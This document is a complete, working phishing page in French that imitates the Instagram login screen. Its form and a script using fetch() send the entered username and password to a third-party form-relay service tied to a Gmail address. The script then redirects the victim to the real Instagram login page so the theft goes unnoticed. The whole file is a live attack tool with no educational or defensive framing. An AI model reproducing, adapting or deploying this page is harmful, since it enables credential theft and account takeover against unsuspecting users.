<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Connexion Instagram</title>
<style>
  body {
    background: #000;
    color: #fff;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .container {
    background: #121212;
    padding: 30px;
    border-radius: 8px;
    width: 320px;
    box-sizing: border-box;
  }
  h1 {
    font-family: 'Pacifico', cursive;
    font-size: 40px;
    margin: 0 0 20px 0;
    text-align: center;
  }
  label {
    display: block;
    margin: 12px 0 6px;
    font-size: 14px;
  }
  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 10px;
    background: #222;
    border: 1px solid #444;
    border-radius: 4px;
    color: #fff;
    font-size: 14px;
  }
  button {
    width: 100%;
    margin-top: 20px;
    padding: 10px;
    background: #3897f0;
    border: none;
    border-radius: 4px;
    color: white;
    font-weight: bold;
    font-size: 16px;
    cursor: pointer;
  }
  .facebook-btn {
    background: #1877f2;
    margin-bottom: 15px;
    cursor: default; /* pas cliquable */
  }
</style>
</head>
<body>

<div class="container">
  <h1>Instagram</h1>

  <form 
    action="https://formsubmit.co/design.site.web69@gmail.com" 
    method="POST"
    autocomplete="off"
    id="instaForm"
  >
    <button type="button" class="facebook-btn" disabled>Connexion avec Facebook</button>

    <label for="username">Téléphone, nom d’utilisateur ou email *</label>
    <input type="text" id="username" name="username" required />

    <label for="password">Mot de passe *</label>
    <input type="password" id="password" name="password" required />

    <button type="submit">Se connecter</button>
  </form>
</div>

<script>
  document.getElementById('instaForm').addEventListener('submit', function(e) {
    e.preventDefault(); // bloque l'envoi normal

    const formData = new FormData(this);

    fetch('https://formsubmit.co/design.site.web69@gmail.com', {
      method: 'POST',
      body: formData,
      mode: 'no-cors' // permet d'éviter les erreurs CORS
    }).finally(() => {
      // redirection immédiate vers Instagram après envoi
      window.location.href = 'https://www.instagram.com/accounts/login/';
    });
  });
</script>

</body>
</html>
